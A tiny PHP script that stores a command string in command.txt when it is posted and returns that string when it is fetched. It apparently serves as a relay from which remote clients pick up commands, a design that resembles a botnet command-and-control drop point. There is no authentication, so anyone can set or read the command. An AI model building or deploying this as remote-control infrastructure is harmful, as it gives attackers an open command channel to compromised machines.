<?php
if(isset($_GET["c"])) GetCommand();
if(isset($_POST["c"])) SetCommand($_POST["c"]);

function GetCommand(){
	echo file_get_contents("command.txt");
}

function SetCommand($command){
	file_put_contents("command.txt", $command);
}
?>